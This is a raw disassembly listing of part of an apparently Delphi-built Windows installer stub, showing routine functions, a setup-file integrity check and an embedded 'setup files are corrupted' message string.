  4087ee:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4087f1:	89 01                	mov    %eax,(%ecx)
  4087f3:	33 c0                	xor    %eax,%eax
  4087f5:	5f                   	pop    %edi
  4087f6:	5e                   	pop    %esi
  4087f7:	5b                   	pop    %ebx
  4087f8:	8b e5                	mov    %ebp,%esp
  4087fa:	5d                   	pop    %ebp
  4087fb:	c2 08 00             	ret    $0x8
  4087fe:	90                   	nop
  4087ff:	90                   	nop
  408800:	55                   	push   %ebp
  408801:	8b ec                	mov    %esp,%ebp
  408803:	51                   	push   %ecx
  408804:	53                   	push   %ebx
  408805:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  408808:	8b d8                	mov    %eax,%ebx
  40880a:	83 fa 50             	cmp    $0x50,%edx
  40880d:	74 07                	je     0x408816
  40880f:	b8 01 00 00 00       	mov    $0x1,%eax
  408814:	eb 32                	jmp    0x408848
  408816:	8b 4d 10             	mov    0x10(%ebp),%ecx
  408819:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40881c:	8b c3                	mov    %ebx,%eax
  40881e:	e8 c1 f8 ff ff       	call   0x4080e4
  408823:	85 c0                	test   %eax,%eax
  408825:	75 21                	jne    0x408848
  408827:	8b 0b                	mov    (%ebx),%ecx
  408829:	ba 00 03 00 00       	mov    $0x300,%edx
  40882e:	03 4b 04             	add    0x4(%ebx),%ecx
  408831:	d3 e2                	shl    %cl,%edx
  408833:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  408836:	81 c2 36 07 00 00    	add    $0x736,%edx
  40883c:	03 d2                	add    %edx,%edx
  40883e:	89 11                	mov    %edx,(%ecx)
  408840:	8b 55 08             	mov    0x8(%ebp),%edx
  408843:	8b 4b 0c             	mov    0xc(%ebx),%ecx
  408846:	89 0a                	mov    %ecx,(%edx)
  408848:	5b                   	pop    %ebx
  408849:	59                   	pop    %ecx
  40884a:	5d                   	pop    %ebp
  40884b:	c2 0c 00             	ret    $0xc
  40884e:	90                   	nop
  40884f:	90                   	nop
  408850:	89 50 10             	mov    %edx,0x10(%eax)
  408853:	89 48 1c             	mov    %ecx,0x1c(%eax)
  408856:	c7 40 48 fe ff ff ff 	movl   $0xfffffffe,0x48(%eax)
  40885d:	c3                   	ret
  40885e:	8b c0                	mov    %eax,%eax
  408860:	55                   	push   %ebp
  408861:	8b ec                	mov    %esp,%ebp
  408863:	83 c4 f0             	add    $0xfffffff0,%esp
  408866:	53                   	push   %ebx
  408867:	56                   	push   %esi
  408868:	57                   	push   %edi
  408869:	33 db                	xor    %ebx,%ebx
  40886b:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  40886e:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  408871:	89 55 fc             	mov    %edx,-0x4(%ebp)
  408874:	8b f8                	mov    %eax,%edi
  408876:	33 c0                	xor    %eax,%eax
  408878:	55                   	push   %ebp
  408879:	68 fe 88 40 00       	push   $0x4088fe
  40887e:	64 ff 30             	push   %fs:(%eax)
  408881:	64 89 20             	mov    %esp,%fs:(%eax)
  408884:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  408887:	8b 75 08             	mov    0x8(%ebp),%esi
  40888a:	85 f6                	test   %esi,%esi
  40888c:	7e 46                	jle    0x4088d4
  40888e:	8d 55 f4             	lea    -0xc(%ebp),%edx
  408891:	b9 04 00 00 00       	mov    $0x4,%ecx
  408896:	8b c7                	mov    %edi,%eax
  408898:	e8 73 f1 ff ff       	call   0x407a10
  40889d:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4088a0:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4088a3:	33 d2                	xor    %edx,%edx
  4088a5:	e8 ce a9 ff ff       	call   0x403278
  4088aa:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  4088ae:	74 14                	je     0x4088c4
  4088b0:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4088b3:	e8 68 ab ff ff       	call   0x403420
  4088b8:	8b d0                	mov    %eax,%edx
  4088ba:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4088bd:	8b c7                	mov    %edi,%eax
  4088bf:	e8 4c f1 ff ff       	call   0x407a10
  4088c4:	8b c3                	mov    %ebx,%eax
  4088c6:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4088c9:	e8 1a a9 ff ff       	call   0x4031e8
  4088ce:	83 c3 04             	add    $0x4,%ebx
  4088d1:	4e                   	dec    %esi
  4088d2:	75 ba                	jne    0x40888e
  4088d4:	8b 45 08             	mov    0x8(%ebp),%eax
  4088d7:	c1 e0 02             	shl    $0x2,%eax
  4088da:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4088dd:	2b c8                	sub    %eax,%ecx
  4088df:	8b d3                	mov    %ebx,%edx
  4088e1:	8b c7                	mov    %edi,%eax
  4088e3:	e8 28 f1 ff ff       	call   0x407a10
  4088e8:	33 c0                	xor    %eax,%eax
  4088ea:	5a                   	pop    %edx
  4088eb:	59                   	pop    %ecx
  4088ec:	59                   	pop    %ecx
  4088ed:	64 89 10             	mov    %edx,%fs:(%eax)
  4088f0:	68 05 89 40 00       	push   $0x408905
  4088f5:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4088f8:	e8 9b a8 ff ff       	call   0x403198
  4088fd:	c3                   	ret
  4088fe:	e9 f9 a4 ff ff       	jmp    0x402dfc
  408903:	eb f0                	jmp    0x4088f5
  408905:	5f                   	pop    %edi
  408906:	5e                   	pop    %esi
  408907:	5b                   	pop    %ebx
  408908:	8b e5                	mov    %ebp,%esp
  40890a:	5d                   	pop    %ebp
  40890b:	c2 04 00             	ret    $0x4
  40890e:	8b c0                	mov    %eax,%eax
  408910:	0e                   	push   %cs
  408911:	13 54 53 65          	adc    0x65(%ebx,%edx,2),%edx
  408915:	74 75                	je     0x40898c
  408917:	70 4c                	jo     0x408965
  408919:	61                   	popa
  40891a:	6e                   	outsb  %ds:(%esi),(%dx)
  40891b:	67 75 61             	addr16 jne 0x40897f
  40891e:	67 65 45             	addr16 gs inc %ebp
  408921:	6e                   	outsb  %ds:(%esi),(%dx)
  408922:	74 72                	je     0x408996
  408924:	79 40                	jns    0x408966
  408926:	00 00                	add    %al,(%eax)
  408928:	00 0a                	add    %cl,(%edx)
  40892a:	00 00                	add    %al,(%eax)
  40892c:	00 00                	add    %al,(%eax)
  40892e:	10 40 00             	adc    %al,0x0(%eax)
  408931:	00 00                	add    %al,(%eax)
  408933:	00 00                	add    %al,(%eax)
  408935:	00 10                	add    %dl,(%eax)
  408937:	40                   	inc    %eax
  408938:	00 04 00             	add    %al,(%eax,%eax,1)
  40893b:	00 00                	add    %al,(%eax)
  40893d:	00 10                	add    %dl,(%eax)
  40893f:	40                   	inc    %eax
  408940:	00 08                	add    %cl,(%eax)
  408942:	00 00                	add    %al,(%eax)
  408944:	00 00                	add    %al,(%eax)
  408946:	10 40 00             	adc    %al,0x0(%eax)
  408949:	0c 00                	or     $0x0,%al
  40894b:	00 00                	add    %al,(%eax)
  40894d:	00 10                	add    %dl,(%eax)
  40894f:	40                   	inc    %eax
  408950:	00 10                	add    %dl,(%eax)
  408952:	00 00                	add    %al,(%eax)
  408954:	00 00                	add    %al,(%eax)
  408956:	10 40 00             	adc    %al,0x0(%eax)
  408959:	14 00                	adc    $0x0,%al
  40895b:	00 00                	add    %al,(%eax)
  40895d:	00 10                	add    %dl,(%eax)
  40895f:	40                   	inc    %eax
  408960:	00 18                	add    %bl,(%eax)
  408962:	00 00                	add    %al,(%eax)
  408964:	00 00                	add    %al,(%eax)
  408966:	10 40 00             	adc    %al,0x0(%eax)
  408969:	1c 00                	sbb    $0x0,%al
  40896b:	00 00                	add    %al,(%eax)
  40896d:	00 10                	add    %dl,(%eax)
  40896f:	40                   	inc    %eax
  408970:	00 20                	add    %ah,(%eax)
  408972:	00 00                	add    %al,(%eax)
  408974:	00 00                	add    %al,(%eax)
  408976:	10 40 00             	adc    %al,0x0(%eax)
  408979:	24 00                	and    $0x0,%al
  40897b:	00 00                	add    %al,(%eax)
  40897d:	8d 40 00             	lea    0x0(%eax),%eax
  408980:	55                   	push   %ebp
  408981:	8b ec                	mov    %esp,%ebp
  408983:	83 c4 f0             	add    $0xfffffff0,%esp
  408986:	53                   	push   %ebx
  408987:	56                   	push   %esi
  408988:	57                   	push   %edi
  408989:	33 db                	xor    %ebx,%ebx
  40898b:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  40898e:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  408991:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  408994:	89 55 fc             	mov    %edx,-0x4(%ebp)
  408997:	8b f0                	mov    %eax,%esi
  408999:	8b 7d 08             	mov    0x8(%ebp),%edi
  40899c:	33 c0                	xor    %eax,%eax
  40899e:	55                   	push   %ebp
  40899f:	68 62 8a 40 00       	push   $0x408a62
  4089a4:	64 ff 30             	push   %fs:(%eax)
  4089a7:	64 89 20             	mov    %esp,%fs:(%eax)
  4089aa:	8b c7                	mov    %edi,%eax
  4089ac:	e8 e7 a7 ff ff       	call   0x403198
  4089b1:	85 f6                	test   %esi,%esi
  4089b3:	0f 84 8e 00 00 00    	je     0x408a47
  4089b9:	b2 25                	mov    $0x25,%dl
  4089bb:	8b c6                	mov    %esi,%eax
  4089bd:	e8 2a c3 ff ff       	call   0x404cec
  4089c2:	8b d8                	mov    %eax,%ebx
  4089c4:	85 db                	test   %ebx,%ebx
  4089c6:	75 16                	jne    0x4089de
  4089c8:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4089cb:	8b d6                	mov    %esi,%edx
  4089cd:	e8 f2 a8 ff ff       	call   0x4032c4
  4089d2:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4089d5:	8b c7                	mov    %edi,%eax
  4089d7:	e8 20 a9 ff ff       	call   0x4032fc
  4089dc:	eb 69                	jmp    0x408a47
  4089de:	3b f3                	cmp    %ebx,%esi
  4089e0:	74 1a                	je     0x4089fc
  4089e2:	8b cb                	mov    %ebx,%ecx
  4089e4:	2b ce                	sub    %esi,%ecx
  4089e6:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4089e9:	8b d6                	mov    %esi,%edx
  4089eb:	e8 88 a8 ff ff       	call   0x403278
  4089f0:	8b c7                	mov    %edi,%eax
  4089f2:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4089f5:	e8 02 a9 ff ff       	call   0x4032fc
  4089fa:	8b f3                	mov    %ebx,%esi
  4089fc:	43                   	inc    %ebx
  4089fd:	8a 03                	mov    (%ebx),%al
  4089ff:	04 cf                	add    $0xcf,%al
  408a01:	2c 09                	sub    $0x9,%al
  408a03:	73 26                	jae    0x408a2b
  408a05:	33 c0                	xor    %eax,%eax
  408a07:	8a 03                	mov    (%ebx),%al
  408a09:	83 e8 31             	sub    $0x31,%eax
  408a0c:	3b 45 f8             	cmp    -0x8(%ebp),%eax
  408a0f:	7f 1a                	jg     0x408a2b
  408a11:	8b c7                	mov    %edi,%eax
  408a13:	33 d2                	xor    %edx,%edx
  408a15:	8a 13                	mov    (%ebx),%dl
  408a17:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  408a1a:	8b 94 91 3c ff ff ff 	mov    -0xc4(%ecx,%edx,4),%edx
  408a21:	e8 d6 a8 ff ff       	call   0x4032fc
  408a26:	83 c6 02             	add    $0x2,%esi
  408a29:	eb 8e                	jmp    0x4089b9
  408a2b:	8b c7                	mov    %edi,%eax
  408a2d:	ba 7c 8a 40 00       	mov    $0x408a7c,%edx
  408a32:	e8 c5 a8 ff ff       	call   0x4032fc
  408a37:	46                   	inc    %esi
  408a38:	80 3b 25             	cmpb   $0x25,(%ebx)
  408a3b:	0f 85 78 ff ff ff    	jne    0x4089b9
  408a41:	46                   	inc    %esi
  408a42:	e9 72 ff ff ff       	jmp    0x4089b9
  408a47:	33 c0                	xor    %eax,%eax
  408a49:	5a                   	pop    %edx
  408a4a:	59                   	pop    %ecx
  408a4b:	59                   	pop    %ecx
  408a4c:	64 89 10             	mov    %edx,%fs:(%eax)
  408a4f:	68 69 8a 40 00       	push   $0x408a69
  408a54:	8d 45 f0             	lea    -0x10(%ebp),%eax
  408a57:	ba 02 00 00 00       	mov    $0x2,%edx
  408a5c:	e8 57 a7 ff ff       	call   0x4031b8
  408a61:	c3                   	ret
  408a62:	e9 95 a3 ff ff       	jmp    0x402dfc
  408a67:	eb eb                	jmp    0x408a54
  408a69:	5f                   	pop    %edi
  408a6a:	5e                   	pop    %esi
  408a6b:	5b                   	pop    %ebx
  408a6c:	8b e5                	mov    %ebp,%esp
  408a6e:	5d                   	pop    %ebp
  408a6f:	c2 04 00             	ret    $0x4
  408a72:	00 00                	add    %al,(%eax)
  408a74:	ff                   	(bad)
  408a75:	ff                   	(bad)
  408a76:	ff                   	(bad)
  408a77:	ff 01                	incl   (%ecx)
  408a79:	00 00                	add    %al,(%eax)
  408a7b:	00 25 00 00 00 55    	add    %ah,0x55000000
  408a81:	8b ec                	mov    %esp,%ebp
  408a83:	53                   	push   %ebx
  408a84:	56                   	push   %esi
  408a85:	57                   	push   %edi
  408a86:	8b f9                	mov    %ecx,%edi
  408a88:	8b f2                	mov    %edx,%esi
  408a8a:	8b d8                	mov    %eax,%ebx
  408a8c:	8b 45 08             	mov    0x8(%ebp),%eax
  408a8f:	50                   	push   %eax
  408a90:	33 c0                	xor    %eax,%eax
  408a92:	8a c3                	mov    %bl,%al
  408a94:	8b 04 85 5c b9 40 00 	mov    0x40b95c(,%eax,4),%eax
  408a9b:	e8 74 a9 ff ff       	call   0x403414
  408aa0:	8b d6                	mov    %esi,%edx
  408aa2:	8b cf                	mov    %edi,%ecx
  408aa4:	e8 d7 fe ff ff       	call   0x408980
  408aa9:	5f                   	pop    %edi
  408aaa:	5e                   	pop    %esi
  408aab:	5b                   	pop    %ebx
  408aac:	5d                   	pop    %ebp
  408aad:	c2 04 00             	ret    $0x4
  408ab0:	53                   	push   %ebx
  408ab1:	56                   	push   %esi
  408ab2:	57                   	push   %edi
  408ab3:	51                   	push   %ecx
  408ab4:	8b f9                	mov    %ecx,%edi
  408ab6:	8b f2                	mov    %edx,%esi
  408ab8:	8b d8                	mov    %eax,%ebx
  408aba:	57                   	push   %edi
  408abb:	89 74 24 04          	mov    %esi,0x4(%esp)
  408abf:	8d 54 24 04          	lea    0x4(%esp),%edx
  408ac3:	33 c9                	xor    %ecx,%ecx
  408ac5:	8b c3                	mov    %ebx,%eax
  408ac7:	e8 b4 ff ff ff       	call   0x408a80
  408acc:	5a                   	pop    %edx
  408acd:	5f                   	pop    %edi
  408ace:	5e                   	pop    %esi
  408acf:	5b                   	pop    %ebx
  408ad0:	c3                   	ret
  408ad1:	8d 40 00             	lea    0x0(%eax),%eax
  408ad4:	53                   	push   %ebx
  408ad5:	56                   	push   %esi
  408ad6:	b3 cf                	mov    $0xcf,%bl
  408ad8:	be 5c b9 40 00       	mov    $0x40b95c,%esi
  408add:	8b c6                	mov    %esi,%eax
  408adf:	e8 b4 a6 ff ff       	call   0x403198
  408ae4:	83 c6 04             	add    $0x4,%esi
  408ae7:	fe cb                	dec    %bl
  408ae9:	75 f2                	jne    0x408add
  408aeb:	5e                   	pop    %esi
  408aec:	5b                   	pop    %ebx
  408aed:	c3                   	ret
  408aee:	8b c0                	mov    %eax,%eax
  408af0:	b9 10 8b 40 00       	mov    $0x408b10,%ecx
  408af5:	b2 01                	mov    $0x1,%dl
  408af7:	b8 b0 45 40 00       	mov    $0x4045b0,%eax
  408afc:	e8 df cc ff ff       	call   0x4057e0
  408b01:	e8 ae a3 ff ff       	call   0x402eb4
  408b06:	c3                   	ret
  408b07:	00 ff                	add    %bh,%bh
  408b09:	ff                   	(bad)
  408b0a:	ff                   	(bad)
  408b0b:	ff 47 00             	incl   0x0(%edi)
  408b0e:	00 00                	add    %al,(%eax)
  408b10:	54                   	push   %esp
  408b11:	68 65 20 73 65       	push   $0x65732065
  408b16:	74 75                	je     0x408b8d
  408b18:	70 20                	jo     0x408b3a
  408b1a:	66 69 6c 65 73 20 61 	imul   $0x6120,0x73(%ebp,%eiz,2),%bp
  408b21:	72 65                	jb     0x408b88
  408b23:	20 63 6f             	and    %ah,0x6f(%ebx)
  408b26:	72 72                	jb     0x408b9a
  408b28:	75 70                	jne    0x408b9a
  408b2a:	74 65                	je     0x408b91
  408b2c:	64 2e 20 50 6c       	fs and %dl,%cs:0x6c(%eax)
  408b31:	65 61                	gs popa
  408b33:	73 65                	jae    0x408b9a
  408b35:	20 6f 62             	and    %ch,0x62(%edi)
  408b38:	74 61                	je     0x408b9b
  408b3a:	69 6e 20 61 20 6e 65 	imul   $0x656e2061,0x20(%esi),%ebp
  408b41:	77 20                	ja     0x408b63
  408b43:	63 6f 70             	arpl   %ebp,0x70(%edi)
  408b46:	79 20                	jns    0x408b68
  408b48:	6f                   	outsl  %ds:(%esi),(%dx)
  408b49:	66 20 74 68 65       	data16 and %dh,0x65(%eax,%ebp,2)
  408b4e:	20 70 72             	and    %dh,0x72(%eax)
  408b51:	6f                   	outsl  %ds:(%esi),(%dx)
  408b52:	67 72 61             	addr16 jb 0x408bb6
  408b55:	6d                   	insl   (%dx),%es:(%edi)
  408b56:	2e 00 53 56          	add    %dl,%cs:0x56(%ebx)
  408b5a:	57                   	push   %edi
  408b5b:	55                   	push   %ebp
  408b5c:	51                   	push   %ecx
  408b5d:	8b fa                	mov    %edx,%edi
  408b5f:	8b f0                	mov    %eax,%esi
  408b61:	83 ff 50             	cmp    $0x50,%edi
  408b64:	7e 13                	jle    0x408b79
  408b66:	8b c6                	mov    %esi,%eax
  408b68:	ba c8 a1 40 00       	mov    $0x40a1c8,%edx
  408b6d:	b9 40 00 00 00       	mov    $0x40,%ecx
  408b72:	e8 95 9b ff ff       	call   0x40270c
  408b77:	74 05                	je     0x408b7e
  408b79:	e8 72 ff ff ff       	call   0x408af0
  408b7e:	8b c6                	mov    %esi,%eax
  408b80:	83 c0 40             	add    $0x40,%eax
  408b83:	89 c3                	mov    %eax,%ebx
  408b85:	8b 43 04             	mov    0x4(%ebx),%eax
  408b88:	8b 53 08             	mov    0x8(%ebx),%edx
  408b8b:	f7 d2                	not    %edx
  408b8d:	3b c2                	cmp    %edx,%eax
  408b8f:	75 0c                	jne    0x408b9d
  408b91:	3b f8                	cmp    %eax,%edi
  408b93:	75 08                	jne    0x408b9d
  408b95:	81 3b cf 00 00 00    	cmpl   $0xcf,(%ebx)
  408b9b:	74 05                	je     0x408ba2
  408b9d:	e8 4e ff ff ff       	call   0x408af0
  408ba2:	8b c3                	mov    %ebx,%eax
  408ba4:	83 c0 10             	add    $0x10,%eax
  408ba7:	89 c5                	mov    %eax,%ebp
  408ba9:	03 73 04             	add    0x4(%ebx),%esi
  408bac:	89 34 24             	mov    %esi,(%esp)
  408baf:	8b 14 24             	mov    (%esp),%edx
  408bb2:	2b d5                	sub    %ebp,%edx
  408bb4:	8b c5                	mov    %ebp,%eax
  408bb6:	e8 29 eb ff ff       	call   0x4076e4
  408bbb:	3b 43 0c             	cmp    0xc(%ebx),%eax
  408bbe:	75 09                	jne    0x408bc9
  408bc0:	8b 04 24             	mov    (%esp),%eax
  408bc3:	80 78 ff 00          	cmpb   $0x0,-0x1(%eax)
  408bc7:	74 05                	je     0x408bce
  408bc9:	e8 22 ff ff ff       	call   0x408af0
  408bce:	b3 cf                	mov    $0xcf,%bl
  408bd0:	be 5c b9 40 00       	mov    $0x40b95c,%esi
  408bd5:	3b 2c 24             	cmp    (%esp),%ebp
  408bd8:	72 05                	jb     0x408bdf
  408bda:	e8 11 ff ff ff       	call   0x408af0
  408bdf:	8b c5                	mov    %ebp,%eax
  408be1:	e8 7e c0 ff ff       	call   0x404c64
  408be6:	8b f8                	mov    %eax,%edi
  408be8:	8b c6                	mov    %esi,%eax
  408bea:	8b cf                	mov    %edi,%ecx
  408bec:	8b d5                	mov    %ebp,%edx
  408bee:	e8 85 a6 ff ff       	call   0x403278
  408bf3:	47                   	inc    %edi
  408bf4:	03 ef                	add    %edi,%ebp
  408bf6:	83 c6 04             	add    $0x4,%esi
  408bf9:	fe cb                	dec    %bl
  408bfb:	75 d8                	jne    0x408bd5
  408bfd:	5a                   	pop    %edx
  408bfe:	5d                   	pop    %ebp
  408bff:	5f                   	pop    %edi
  408c00:	5e                   	pop    %esi
  408c01:	5b                   	pop    %ebx
  408c02:	c3                   	ret
  408c03:	90                   	nop
  408c04:	e8 cb fe ff ff       	call   0x408ad4
  408c09:	c3                   	ret
  408c0a:	8b c0                	mov    %eax,%eax
  408c0c:	55                   	push   %ebp
  408c0d:	8b ec                	mov    %esp,%ebp
  408c0f:	53                   	push   %ebx
  408c10:	56                   	push   %esi
  408c11:	57                   	push   %edi
  408c12:	33 c0                	xor    %eax,%eax
  408c14:	55                   	push   %ebp
  408c15:	68 38 8c 40 00       	push   $0x408c38
  408c1a:	64 ff 30             	push   %fs:(%eax)
  408c1d:	64 89 20             	mov    %esp,%fs:(%eax)
  408c20:	b8 08 a2 40 00       	mov    $0x40a208,%eax
  408c25:	e8 da ad ff ff       	call   0x403a04
  408c2a:	33 c0                	xor    %eax,%eax
  408c2c:	5a                   	pop    %edx
  408c2d:	59                   	pop    %ecx
  408c2e:	59                   	pop    %ecx
  408c2f:	64 89 10             	mov    %edx,%fs:(%eax)
  408c32:	68 3f 8c 40 00       	push   $0x408c3f
  408c37:	c3                   	ret
  408c38:	e9 bf a1 ff ff       	jmp    0x402dfc
  408c3d:	eb f8                	jmp    0x408c37
  408c3f:	5f                   	pop    %edi
  408c40:	5e                   	pop    %esi
  408c41:	5b                   	pop    %ebx
  408c42:	5d                   	pop    %ebp
  408c43:	c3                   	ret
  408c44:	53                   	push   %ebx
  408c45:	8b da                	mov    %edx,%ebx
  408c47:	c6 03 00             	movb   $0x0,(%ebx)
  408c4a:	84 c0                	test   %al,%al
  408c4c:	75 04                	jne    0x408c52
  408c4e:	b0 01                	mov    $0x1,%al
  408c50:	5b                   	pop    %ebx
  408c51:	c3                   	ret
  408c52:	80 3d a0 bc 40 00 00 	cmpb   $0x0,0x40bca0
  408c59:	74 19                	je     0x408c74
  408c5b:	8d 43 04             	lea    0x4(%ebx),%eax
  408c5e:	50                   	push   %eax
  408c5f:	ff 15 98 bc 40 00    	call   *0x40bc98
  408c65:	f7 d8                	neg    %eax
  408c67:	1b c0                	sbb    %eax,%eax
  408c69:	f7 d8                	neg    %eax
  408c6b:	84 c0                	test   %al,%al
  408c6d:	74 0e                	je     0x408c7d
  408c6f:	c6 03 01             	movb   $0x1,(%ebx)
  408c72:	eb 09                	jmp    0x408c7d
  408c74:	6a 01                	push   $0x1
  408c76:	e8 61 b8 ff ff       	call   0x4044dc
  408c7b:	33 c0                	xor    %eax,%eax
  408c7d:	5b                   	pop    %ebx
  408c7e:	c3                   	ret
  408c7f:	90                   	nop
  408c80:	80 38 00             	cmpb   $0x0,(%eax)
  408c83:	74 0a                	je     0x408c8f
  408c85:	8b 40 04             	mov    0x4(%eax),%eax
  408c88:	50                   	push   %eax
  408c89:	ff 15 9c bc 40 00    	call   *0x40bc9c
  408c8f:	c3                   	ret
  408c90:	55                   	push   %ebp
  408c91:	8b ec                	mov    %esp,%ebp
  408c93:	83 c4 f0             	add    $0xfffffff0,%esp
  408c96:	53                   	push   %ebx
  408c97:	56                   	push   %esi
  408c98:	8b f2                	mov    %edx,%esi
  408c9a:	8b d8                	mov    %eax,%ebx
  408c9c:	8d 55 f4             	lea    -0xc(%ebp),%edx
  408c9f:	8b c3                	mov    %ebx,%eax
  408ca1:	e8 9e ff ff ff       	call   0x408c44
  408ca6:	84 c0                	test   %al,%al
  408ca8:	75 07                	jne    0x408cb1
  408caa:	33 c0                	xor    %eax,%eax
  408cac:	89 45 fc             	mov    %eax,-0x4(%ebp)
  408caf:	eb 4c                	jmp    0x408cfd
  408cb1:	33 c0                	xor    %eax,%eax
  408cb3:	55                   	push   %ebp
  408cb4:	68 ed 8c 40 00       	push   $0x408ced
  408cb9:	64 ff 30             	push   %fs:(%eax)
  408cbc:	64 89 20             	mov    %esp,%fs:(%eax)
  408cbf:	8b c6                	mov    %esi,%eax
  408cc1:	e8 4e a7 ff ff       	call   0x403414
  408cc6:	50                   	push   %eax
  408cc7:	e8 18 b7 ff ff       	call   0x4043e4
  408ccc:	89 45 fc             	mov    %eax,-0x4(%ebp)
  408ccf:	e8 70 b7 ff ff       	call   0x404444
  408cd4:	89 45 f0             	mov    %eax,-0x10(%ebp)
  408cd7:	33 c0                	xor    %eax,%eax
  408cd9:	5a                   	pop    %edx
  408cda:	59                   	pop    %ecx
  408cdb:	59                   	pop    %ecx
  408cdc:	64 89 10             	mov    %edx,%fs:(%eax)
  408cdf:	68 f4 8c 40 00       	push   $0x408cf4
  408ce4:	8d 45 f4             	lea    -0xc(%ebp),%eax
  408ce7:	e8 94 ff ff ff       	call   0x408c80
  408cec:	c3                   	ret
  408ced:	e9 0a a1 ff ff       	jmp    0x402dfc
  408cf2:	eb f0                	jmp    0x408ce4
  408cf4:	8b 45 f0             	mov    -0x10(%ebp),%eax
  408cf7:	50                   	push   %eax
  408cf8:	e8 df b7 ff ff       	call   0x4044dc
  408cfd:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408d00:	5e                   	pop    %esi
  408d01:	5b                   	pop    %ebx
  408d02:	8b e5                	mov    %ebp,%esp
  408d04:	5d                   	pop    %ebp
  408d05:	c3                   	ret
  408d06:	8b c0                	mov    %eax,%eax
  408d08:	55                   	push   %ebp
  408d09:	8b ec                	mov    %esp,%ebp
  408d0b:	83 c4 f0             	add    $0xfffffff0,%esp
  408d0e:	53                   	push   %ebx
  408d0f:	56                   	push   %esi
  408d10:	8b f2                	mov    %edx,%esi
  408d12:	8b d8                	mov    %eax,%ebx
  408d14:	8d 55 f4             	lea    -0xc(%ebp),%edx
  408d17:	8b c3                	mov    %ebx,%eax
  408d19:	e8 26 ff ff ff       	call   0x408c44
  408d1e:	84 c0                	test   %al,%al
  408d20:	75 06                	jne    0x408d28
  408d22:	c6 45 ff 00          	movb   $0x0,-0x1(%ebp)
  408d26:	eb 46                	jmp    0x408d6e
  408d28:	33 c0                	xor    %eax,%eax
  408d2a:	55                   	push   %ebp
  408d2b:	68 5e 8d 40 00       	push   $0x408d5e
  408d30:	64 ff 30             	push   %fs:(%eax)
  408d33:	64 89 20             	mov    %esp,%fs:(%eax)
  408d36:	8b c6                	mov    %esi,%eax
  408d38:	e8 ef da ff ff       	call   0x40682c
  408d3d:	88 45 ff             	mov    %al,-0x1(%ebp)
  408d40:	e8 ff b6 ff ff       	call   0x404444
  408d45:	89 45 f0             	mov    %eax,-0x10(%ebp)
  408d48:	33 c0                	xor    %eax,%eax
  408d4a:	5a                   	pop    %edx
  408d4b:	59                   	pop    %ecx
  408d4c:	59                   	pop    %ecx
  408d4d:	64 89 10             	mov    %edx,%fs:(%eax)
  408d50:	68 65 8d 40 00       	push   $0x408d65
  408d55:	8d 45 f4             	lea    -0xc(%ebp),%eax
  408d58:	e8 23 ff ff ff       	call   0x408c80
  408d5d:	c3                   	ret
  408d5e:	e9 99 a0 ff ff       	jmp    0x402dfc
  408d63:	eb f0                	jmp    0x408d55
  408d65:	8b 45 f0             	mov    -0x10(%ebp),%eax
  408d68:	50                   	push   %eax
  408d69:	e8 6e b7 ff ff       	call   0x4044dc
  408d6e:	8a 45 ff             	mov    -0x1(%ebp),%al
  408d71:	5e                   	pop    %esi
  408d72:	5b                   	pop    %ebx
  408d73:	8b e5                	mov    %ebp,%esp
  408d75:	5d                   	pop    %ebp
  408d76:	c3                   	ret
  408d77:	90                   	nop
  408d78:	55                   	push   %ebp
  408d79:	8b ec                	mov    %esp,%ebp
  408d7b:	6a 00                	push   $0x0
  408d7d:	53                   	push   %ebx
  408d7e:	56                   	push   %esi
  408d7f:	57                   	push   %edi
  408d80:	33 c0                	xor    %eax,%eax
  408d82:	55                   	push   %ebp
  408d83:	68 11 8e 40 00       	push   $0x408e11
  408d88:	64 ff 30             	push   %fs:(%eax)
  408d8b:	64 89 20             	mov    %esp,%fs:(%eax)
  408d8e:	68 20 8e 40 00       	push   $0x408e20
  408d93:	68 40 8e 40 00       	push   $0x408e40
  408d98:	e8 bf b6 ff ff       	call   0x40445c
  408d9d:	50                   	push   %eax
  408d9e:	e8 c1 b6 ff ff       	call   0x404464
  408da3:	a3 98 bc 40 00       	mov    %eax,0x40bc98
  408da8:	68 50 8e 40 00       	push   $0x408e50
  408dad:	68 40 8e 40 00       	push   $0x408e40
  408db2:	e8 a5 b6 ff ff       	call   0x40445c
  408db7:	50                   	push   %eax
  408db8:	e8 a7 b6 ff ff       	call   0x404464
  408dbd:	a3 9c bc 40 00       	mov    %eax,0x40bc9c
  408dc2:	83 3d 98 bc 40 00 00 	cmpl   $0x0,0x40bc98
  408dc9:	74 09                	je     0x408dd4
  408dcb:	83 3d 9c bc 40 00 00 	cmpl   $0x0,0x40bc9c
  408dd2:	75 04                	jne    0x408dd8
  408dd4:	33 c0                	xor    %eax,%eax
  408dd6:	eb 02                	jmp    0x408dda
  408dd8:	b0 01                	mov    $0x1,%al
  408dda:	a2 a0 bc 40 00       	mov    %al,0x40bca0
  408ddf:	ba 00 80 00 00       	mov    $0x8000,%edx
  408de4:	b8 78 8e 40 00       	mov    $0x408e78,%eax
  408de9:	e8 8a df ff ff       	call   0x406d78
  408dee:	8d 55 fc             	lea    -0x4(%ebp),%edx
  408df1:	b8 fb 3a 78 4c       	mov    $0x4c783afb,%eax
  408df6:	e8 61 e2 ff ff       	call   0x40705c
  408dfb:	33 c0                	xor    %eax,%eax
  408dfd:	5a                   	pop    %edx
  408dfe:	59                   	pop    %ecx
  408dff:	59                   	pop    %ecx
